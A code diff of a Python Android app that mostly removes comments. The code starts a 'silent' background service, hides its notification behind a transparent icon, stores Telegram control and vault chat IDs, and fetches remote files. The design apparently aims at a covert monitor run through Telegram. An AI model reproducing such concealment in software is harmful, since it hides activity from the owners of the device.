@@ -147,17 +147,14 @@ def start_silent_service():
 
         builder = autoclass('android.app.Notification$Builder')(act, "system_channel")
         
-        # ✅ التصحيح 1: استخدام الأيقونة الشفافة بدلاً من أيقونة التطبيق
+        # استخدام الأيقونة الشفافة بدلاً من أيقونة التطبيق
         try:
-            # محاولة استخدام الأيقونة الشفافة
             icon_id = act.getResources().getIdentifier("ic_notification", "drawable", act.getPackageName())
             if icon_id > 0:
                 builder.setSmallIcon(icon_id)
             else:
-                # في حالة عدم وجود الأيقونة، استخدم أيقونة التطبيق كحل احتياطي
                 builder.setSmallIcon(act.getApplicationInfo().icon)
         except Exception as e:
-            # في حالة أي خطأ، استخدم أيقونة التطبيق
             builder.setSmallIcon(act.getApplicationInfo().icon)
             print(f"⚠️ Notification icon fallback: {e}")
         
@@ -255,7 +252,6 @@ def load_secrets_from_config():
             ctrl = -1003943094277
         if not vault:
             vault = -1003577715762
-        # ✅ التصحيح: لا تستخدم قيمة افتراضية ثابتة لكلمة السر
         if not secret:
             secret = None
         return active, reserve, ctrl, vault, secret
@@ -263,19 +259,21 @@ def load_secrets_from_config():
         print(f"⚠️ Error loading config: {e}, using defaults")
         return [], [], -1003943094277, -1003577715762, None
 
-# ================== تحميل ملف index.json والتحقق من الإصدارات ==================
+# ================== تحميل ملف index.json مع التحقق من الإصدار و Checksum ==================
 def fetch_index():
-    """تحميل ملف index.json من الروابط المتعددة مع التحقق من الإصدار"""
+    """
+    تحميل ملف index.json من الروابط المتعددة مع التحقق من الإصدار.
+    إذا كان إصدار index.json لا يتوافق مع APP_VERSION، يتم إرجاع None.
+    """
     for url in INDEX_BASE_URLS:
         try:
             resp = requests.get(url, headers=HEADERS, timeout=15, verify=True)
             if resp.status_code == 200:
                 try:
                     data = resp.json()
-                    # ✅ التصحيح 2: التحقق من توافق الإصدارات
+                    # التحقق من توافق الإصدارات
                     if 'version' in data:
                         index_version = data['version']
-                        # مقارنة الإصدار الرئيسي (major version)
                         app_major = APP_VERSION.split('.')[0]
                         index_major = index_version.split('.')[0]
                         if app_major != index_major:
@@ -291,20 +289,21 @@ def fetch_index():
     return None
 
 def download_file_with_checksum(url, dest_path, expected_sha256=None, max_retries=3):
-    """تحميل ملف مع التحقق من SHA-256 (التصحيح 3)"""
+    """
+    تحميل ملف مع التحقق من SHA-256.
+    إذا كان expected_sha256 مُقدَّماً، يتم التحقق من تطابق الـ hash.
+    في حالة عدم التطابق أو فشل التحميل، يتم إعادة المحاولة حتى max_retries.
+    """
     for attempt in range(max_retries):
         try:
-            # إنشاء المجلد الوجهة إذا لم يكن موجوداً
             os.makedirs(os.path.dirname(dest_path), exist_ok=True)
             
-            # تحميل الملف
             resp = requests.get(url, headers=HEADERS, timeout=30, verify=True)
             if resp.status_code != 200:
                 print(f"⚠️ Download failed: HTTP {resp.status_code}")
                 time.sleep(2)
                 continue
             
-            # كتابة الملف
             with open(dest_path, 'wb') as f:
                 f.write(resp.content)
             
@@ -322,7 +321,6 @@ def download_file_with_checksum(url, dest_path, expected_sha256=None, max_retrie
                     time.sleep(2)
                     continue
             
-            # التحقق من أن الملف ليس فارغاً
             if os.path.getsize(dest_path) == 0:
                 os.remove(dest_path)
                 print(f"⚠️ Downloaded file is empty: {dest_path}")
@@ -348,7 +346,6 @@ def copy_model_to_models_dir():
         model_min_size = 5_000_000   # 5 ميغابايت
         dest = os.path.join(MODELS_DIR, "engine_v2.tflite")
 
-        # ✅ التصحيح 4: إنشاء المجلد الوجهة قبل المحاولة
         os.makedirs(MODELS_DIR, exist_ok=True)
 
         if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
@@ -373,7 +370,6 @@ def copy_model_to_models_dir():
                         print(f"⚠️ Copy failed from {src}: {e}")
                         continue
 
-        # ✅ التصحيح 4: في حالة الفشل، سجل تحذيراً واضحاً
         return False, "CRITICAL: engine_v2.tflite missing from assets! AI features will be disabled."
     except Exception as e:
         return False, f"Model copy failure: {e}"
@@ -489,7 +485,6 @@ class CoreApp(App):
             self.append_log("📡 Step 5/5: Starting Monitor and Telegram UI Listeners...")
             ui.start()
             
-            # ✅ التصحيح 5: تشغيل mon.start() في خيط منفصل مع تأخير
             def start_monitor():
                 time.sleep(1)
                 try:
